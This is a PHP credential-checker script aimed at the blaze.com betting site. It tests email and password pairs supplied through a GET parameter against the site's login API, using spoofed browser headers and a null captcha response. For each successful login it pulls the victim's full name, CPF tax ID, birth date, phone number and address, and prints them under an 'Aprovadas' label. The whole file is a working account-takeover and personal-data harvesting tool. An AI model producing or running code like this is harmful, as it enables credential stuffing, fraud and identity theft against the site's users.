<?php
error_reporting(0);
extract($_GET);

function puxar($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
function filtrar($query, $value)
{

    $inicio = str_replace($query, $query[0], $value);
    $fim = explode($query[0], $inicio);
    return $fim;
}

$lista = $_GET['lista'];
$email = filtrar(array(":", "|"), $lista)[0];
$senha = filtrar(array(":", "|"), $lista)[1];


$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://blaze.com/api/auth/password?analyticSessionID=1720153041909');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PUT');

curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"username\":\"$email\",\"password\":\"$senha\"}");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Host: blaze.com';
$headers[] = 'Cookie: _gid=GA1.2.427186249.1720153040; AMP_MKTG_c9c53a1635=JTdCJTdE; _did=web_982337574FBD9BCA; kwai_uuid=1af0855a16ab3e2c681ce3148ec3eb69; __qca=P0-457750015-1720153043085; __zlcmid=1MbmqQP98FbZNBF; 57942=; 58312=; 58313=; 59942=; 57928=; 58306=; 59941=; 57927=; 57941=; 58305=; dicbo_id=%7B%22dicbo_fetch%22%3A1720153644315%7D; AMP_c9c53a1635=JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjJiMTgwNDU4Yy03NWEyLTQ4NGMtYTkxMi05ODIwZGNkYWM2NDclMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNzIwMTUzMDQxOTA5JTJDJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJsYXN0RXZlbnRUaW1lJTIyJTNBMTcyMDE1MzA0MTk3NyUyQyUyMmxhc3RFdmVudElkJTIyJTNBMCU3RA==; _gat=1; _ga=GA1.1.349468616.1720153040; _ga_873EZ35BX8=GS1.1.1720153042.1.1.1720153928.53.0.790538054; _ga_RRQBT7YBYB=GS1.1.1720153042.1.1.1720153928.0.0.0';
$headers[] = 'Sec-Ch-Ua: \"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"';
$headers[] = 'X-Captcha-Response: null';
$headers[] = 'Device_id: b180458c-75a2-484c-a912-9820dcdac647';
$headers[] = 'X-Client-Version: v2.2081.0';
$headers[] = 'Sec-Ch-Ua-Mobile: ?0';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36';
$headers[] = 'Content-Type: application/json;charset=UTF-8';
$headers[] = 'Accept: application/json, text/plain, */*';
$headers[] = 'Session_id: 1720153041909';
$headers[] = 'X-Client-Language: pt';
$headers[] = 'Sec-Ch-Ua-Platform: \"Windows\"';
$headers[] = 'Origin: https://blaze.com';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Referer: https://blaze.com/pt/?modal=auth&tab=login';
$headers[] = 'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7';
$headers[] = 'Priority: u=1, i';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);


$resposta1 = curl_exec($ch);
$token = puxar($resposta1, '"access_token":"', '"');


$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://blaze.com/api/users/me');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Host: blaze.com';
$headers[] = 'Cookie: _gid=GA1.2.427186249.1720153040; AMP_MKTG_c9c53a1635=JTdCJTdE; _did=web_982337574FBD9BCA; kwai_uuid=1af0855a16ab3e2c681ce3148ec3eb69; __qca=P0-457750015-1720153043085; __zlcmid=1MbmqQP98FbZNBF; 57942=; 58312=; 58313=; 59942=; 57928=; 58306=; 59941=; 57927=; 57941=; 58305=; AMP_c9c53a1635=JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjJiMTgwNDU4Yy03NWEyLTQ4NGMtYTkxMi05ODIwZGNkYWM2NDclMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNzIwMTUzMDQxOTA5JTJDJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJsYXN0RXZlbnRUaW1lJTIyJTNBMTcyMDE1MzA0MTk3NyUyQyUyMmxhc3RFdmVudElkJTIyJTNBMCU3RA==; _gat=1; _ga=GA1.1.349468616.1720153040; _ga_873EZ35BX8=GS1.1.1720153042.1.1.1720153928.53.0.790538054; _ga_RRQBT7YBYB=GS1.1.1720153042.1.1.1720153928.0.0.0';
$headers[] = 'Sec-Ch-Ua: \"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"';
$headers[] = 'X-Captcha-Response: null';
$headers[] = 'Device_id: b180458c-75a2-484c-a912-9820dcdac647';
$headers[] = 'X-Client-Version: v2.2081.0';
$headers[] = 'Sec-Ch-Ua-Mobile: ?0';
$headers[] = 'Authorization: Bearer ' . $token . '';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36';
$headers[] = 'Accept: application/json, text/plain, */*';
$headers[] = 'Session_id: 1720153041909';
$headers[] = 'X-Client-Language: pt';
$headers[] = 'Sec-Ch-Ua-Platform: \"Windows\"';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Referer: https://blaze.com/pt/?modal=auth&tab=login';
$headers[] = 'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7';
$headers[] = 'Priority: u=1, i';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);


$resposta2 = curl_exec($ch);
$nome = puxar($resposta2, '"username":"', '"');
$sobre = puxar($resposta2, '"last_name":"', '"');
$cpf = puxar($resposta2, '"tax_id":"', '"');
$datan = puxar($resposta2, '"date_of_birth":"', '"');
$numero = puxar($resposta2, '"phone_number":"', '"');
$endereço = puxar($resposta2, '"address":"', '"');
$cidade = puxar($resposta2, '"city":"', '"');
$estado = puxar($resposta2, '"state":"', '"');
$cep = puxar($resposta2, '"postal_code":"', '"');
//$saldo = puxar($resposta2, '"real_balance":"','"');


if (strpos($resposta1, 'access_token')) {

    echo '<font color="#FFFFFF"> ✅Aprovadas  </font> <font color="#FFFFFF"> ' . $email . "|" . $senha . "<br> NOME : " . $nome . " " . $sobre . " | CPF : " . $cpf . " | DATA DE NASCIMENTO : " . $datan . " | NUMERO : " . $numero . " | CIDADE : " . $cidade . " | ESTADO : " . $estado . " | CEP : " . $cep . " | " . $saldo . '- Retorno: Login blaze efetuado com sucesso!';
} else {
    echo '<font color="#FF0000">🔴Reprovada</font> <font color="#FF0000"> ' . $email . "|" . $senha . ' - Retorno: Email ou senha incorretos';
}